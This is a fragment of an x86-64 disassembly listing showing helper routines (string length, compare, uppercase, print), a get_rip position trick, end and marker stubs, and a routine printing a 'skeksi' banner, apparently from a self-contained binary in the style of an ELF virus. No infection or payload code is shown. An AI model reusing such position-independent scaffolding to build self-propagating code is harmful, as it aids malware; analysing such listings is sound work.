  402b4a:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  402b4e:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402b51:	89 c2                	mov    edx,eax
  402b53:	c1 ea 1f             	shr    edx,0x1f
  402b56:	01 d0                	add    eax,edx
  402b58:	d1 f8                	sar    eax,1
  402b5a:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  402b5d:	0f 8c 36 ff ff ff    	jl     402a99 <itox+0xda>
  402b63:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402b67:	5d                   	pop    rbp
  402b68:	c3                   	ret    

0000000000402b69 <_puts>:
  402b69:	55                   	push   rbp
  402b6a:	48 89 e5             	mov    rbp,rsp
  402b6d:	48 83 ec 10          	sub    rsp,0x10
  402b71:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402b75:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402b79:	48 89 c7             	mov    rdi,rax
  402b7c:	e8 78 00 00 00       	call   402bf9 <_strlen>
  402b81:	48 89 c2             	mov    rdx,rax
  402b84:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402b88:	48 89 c6             	mov    rsi,rax
  402b8b:	bf 01 00 00 00       	mov    edi,0x1
  402b90:	e8 58 f6 ff ff       	call   4021ed <_write>
  402b95:	bf 01 00 00 00       	mov    edi,0x1
  402b9a:	e8 27 f7 ff ff       	call   4022c6 <_fsync>
  402b9f:	b8 01 00 00 00       	mov    eax,0x1
  402ba4:	c9                   	leave  
  402ba5:	c3                   	ret    

0000000000402ba6 <_puts_nl>:
  402ba6:	55                   	push   rbp
  402ba7:	48 89 e5             	mov    rbp,rsp
  402baa:	48 83 ec 10          	sub    rsp,0x10
  402bae:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402bb2:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402bb6:	48 89 c7             	mov    rdi,rax
  402bb9:	e8 3b 00 00 00       	call   402bf9 <_strlen>
  402bbe:	48 89 c2             	mov    rdx,rax
  402bc1:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402bc5:	48 89 c6             	mov    rsi,rax
  402bc8:	bf 01 00 00 00       	mov    edi,0x1
  402bcd:	e8 1b f6 ff ff       	call   4021ed <_write>
  402bd2:	ba 01 00 00 00       	mov    edx,0x1
  402bd7:	48 8d 35 17 03 00 00 	lea    rsi,[rip+0x317]        # 402ef5 <display_skeksi+0x14e>
  402bde:	bf 01 00 00 00       	mov    edi,0x1
  402be3:	e8 05 f6 ff ff       	call   4021ed <_write>
  402be8:	bf 01 00 00 00       	mov    edi,0x1
  402bed:	e8 d4 f6 ff ff       	call   4022c6 <_fsync>
  402bf2:	b8 01 00 00 00       	mov    eax,0x1
  402bf7:	c9                   	leave  
  402bf8:	c3                   	ret    

0000000000402bf9 <_strlen>:
  402bf9:	55                   	push   rbp
  402bfa:	48 89 e5             	mov    rbp,rsp
  402bfd:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402c01:	48 c7 45 f8 00 00 00 	mov    QWORD PTR [rbp-0x8],0x0
  402c08:	00 
  402c09:	eb 05                	jmp    402c10 <_strlen+0x17>
  402c0b:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  402c10:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  402c14:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c18:	48 01 d0             	add    rax,rdx
  402c1b:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402c1e:	84 c0                	test   al,al
  402c20:	75 e9                	jne    402c0b <_strlen+0x12>
  402c22:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c26:	5d                   	pop    rbp
  402c27:	c3                   	ret    

0000000000402c28 <_toupper>:
  402c28:	55                   	push   rbp
  402c29:	48 89 e5             	mov    rbp,rsp
  402c2c:	89 f8                	mov    eax,edi
  402c2e:	88 45 fc             	mov    BYTE PTR [rbp-0x4],al
  402c31:	80 7d fc 60          	cmp    BYTE PTR [rbp-0x4],0x60
  402c35:	7e 16                	jle    402c4d <_toupper+0x25>
  402c37:	80 7d fc 7a          	cmp    BYTE PTR [rbp-0x4],0x7a
  402c3b:	7f 10                	jg     402c4d <_toupper+0x25>
  402c3d:	0f b6 45 fc          	movzx  eax,BYTE PTR [rbp-0x4]
  402c41:	83 e8 20             	sub    eax,0x20
  402c44:	88 45 fc             	mov    BYTE PTR [rbp-0x4],al
  402c47:	0f b6 45 fc          	movzx  eax,BYTE PTR [rbp-0x4]
  402c4b:	eb 04                	jmp    402c51 <_toupper+0x29>
  402c4d:	0f b6 45 fc          	movzx  eax,BYTE PTR [rbp-0x4]
  402c51:	5d                   	pop    rbp
  402c52:	c3                   	ret    

0000000000402c53 <_strncmp>:
  402c53:	55                   	push   rbp
  402c54:	48 89 e5             	mov    rbp,rsp
  402c57:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402c5b:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
  402c5f:	48 89 55 e8          	mov    QWORD PTR [rbp-0x18],rdx
  402c63:	eb 53                	jmp    402cb8 <_strncmp+0x65>
  402c65:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c69:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402c6c:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402c70:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402c73:	38 c2                	cmp    dl,al
  402c75:	74 20                	je     402c97 <_strncmp+0x44>
  402c77:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c7b:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402c7e:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402c82:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402c85:	38 c2                	cmp    dl,al
  402c87:	73 07                	jae    402c90 <_strncmp+0x3d>
  402c89:	b8 ff ff ff ff       	mov    eax,0xffffffff
  402c8e:	eb 34                	jmp    402cc4 <_strncmp+0x71>
  402c90:	b8 01 00 00 00       	mov    eax,0x1
  402c95:	eb 2d                	jmp    402cc4 <_strncmp+0x71>
  402c97:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c9b:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402c9e:	84 c0                	test   al,al
  402ca0:	75 07                	jne    402ca9 <_strncmp+0x56>
  402ca2:	b8 00 00 00 00       	mov    eax,0x0
  402ca7:	eb 1b                	jmp    402cc4 <_strncmp+0x71>
  402ca9:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  402cae:	48 83 45 f0 01       	add    QWORD PTR [rbp-0x10],0x1
  402cb3:	48 83 6d e8 01       	sub    QWORD PTR [rbp-0x18],0x1
  402cb8:	48 83 7d e8 00       	cmp    QWORD PTR [rbp-0x18],0x0
  402cbd:	75 a6                	jne    402c65 <_strncmp+0x12>
  402cbf:	b8 00 00 00 00       	mov    eax,0x0
  402cc4:	5d                   	pop    rbp
  402cc5:	c3                   	ret    

0000000000402cc6 <_strcmp>:
  402cc6:	55                   	push   rbp
  402cc7:	48 89 e5             	mov    rbp,rsp
  402cca:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402cce:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
  402cd2:	eb 1c                	jmp    402cf0 <_strcmp+0x2a>
  402cd4:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402cd8:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402cdb:	84 c0                	test   al,al
  402cdd:	75 07                	jne    402ce6 <_strcmp+0x20>
  402cdf:	b8 00 00 00 00       	mov    eax,0x0
  402ce4:	eb 3a                	jmp    402d20 <_strcmp+0x5a>
  402ce6:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  402ceb:	48 83 45 f0 01       	add    QWORD PTR [rbp-0x10],0x1
  402cf0:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402cf4:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402cf7:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402cfb:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402cfe:	38 c2                	cmp    dl,al
  402d00:	74 d2                	je     402cd4 <_strcmp+0xe>
  402d02:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402d06:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402d09:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402d0d:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402d10:	38 c2                	cmp    dl,al
  402d12:	73 07                	jae    402d1b <_strcmp+0x55>
  402d14:	b8 ff ff ff ff       	mov    eax,0xffffffff
  402d19:	eb 05                	jmp    402d20 <_strcmp+0x5a>
  402d1b:	b8 01 00 00 00       	mov    eax,0x1
  402d20:	5d                   	pop    rbp
  402d21:	c3                   	ret    

0000000000402d22 <_memcmp>:
  402d22:	55                   	push   rbp
  402d23:	48 89 e5             	mov    rbp,rsp
  402d26:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402d2a:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402d2e:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  402d31:	eb 35                	jmp    402d68 <_memcmp+0x46>
  402d33:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  402d37:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402d3a:	88 45 ff             	mov    BYTE PTR [rbp-0x1],al
  402d3d:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402d41:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402d44:	88 45 fe             	mov    BYTE PTR [rbp-0x2],al
  402d47:	0f b6 45 ff          	movzx  eax,BYTE PTR [rbp-0x1]
  402d4b:	3a 45 fe             	cmp    al,BYTE PTR [rbp-0x2]
  402d4e:	74 0e                	je     402d5e <_memcmp+0x3c>
  402d50:	0f b6 55 ff          	movzx  edx,BYTE PTR [rbp-0x1]
  402d54:	0f b6 45 fe          	movzx  eax,BYTE PTR [rbp-0x2]
  402d58:	29 c2                	sub    edx,eax
  402d5a:	89 d0                	mov    eax,edx
  402d5c:	eb 17                	jmp    402d75 <_memcmp+0x53>
  402d5e:	48 83 45 e8 01       	add    QWORD PTR [rbp-0x18],0x1
  402d63:	48 83 45 e0 01       	add    QWORD PTR [rbp-0x20],0x1
  402d68:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  402d6b:	8d 50 ff             	lea    edx,[rax-0x1]
  402d6e:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  402d71:	85 c0                	test   eax,eax
  402d73:	75 be                	jne    402d33 <_memcmp+0x11>
  402d75:	5d                   	pop    rbp
  402d76:	c3                   	ret    

0000000000402d77 <get_rip>:
  402d77:	55                   	push   rbp
  402d78:	48 89 e5             	mov    rbp,rsp
  402d7b:	e8 00 00 00 00       	call   402d80 <get_rip_label>

0000000000402d80 <get_rip_label>:
  402d80:	58                   	pop    rax
  402d81:	48 89 c0             	mov    rax,rax
  402d84:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402d88:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402d8c:	5d                   	pop    rbp
  402d8d:	c3                   	ret    

0000000000402d8e <end_code>:
  402d8e:	55                   	push   rbp
  402d8f:	48 89 e5             	mov    rbp,rsp
  402d92:	bf 00 00 00 00       	mov    edi,0x0
  402d97:	e8 b8 f3 ff ff       	call   402154 <Exit>
  402d9c:	90                   	nop
  402d9d:	5d                   	pop    rbp
  402d9e:	c3                   	ret    

0000000000402d9f <dummy_marker>:
  402d9f:	55                   	push   rbp
  402da0:	48 89 e5             	mov    rbp,rsp
  402da3:	90                   	nop
  402da4:	90                   	nop
  402da5:	5d                   	pop    rbp
  402da6:	c3                   	ret    

0000000000402da7 <display_skeksi>:
  402da7:	55                   	push   rbp
  402da8:	48 89 e5             	mov    rbp,rsp
  402dab:	ba ed 3b 00 00       	mov    edx,0x3bed
  402db0:	48 8d 05 49 01 00 00 	lea    rax,[rip+0x149]        # 402f00 <skeksi_banner>
  402db7:	48 89 c6             	mov    rsi,rax
  402dba:	bf 01 00 00 00       	mov    edi,0x1
  402dbf:	e8 29 f4 ff ff       	call   4021ed <_write>
  402dc4:	90                   	nop
  402dc5:	5d                   	pop    rbp
  402dc6:	c3                   	ret    
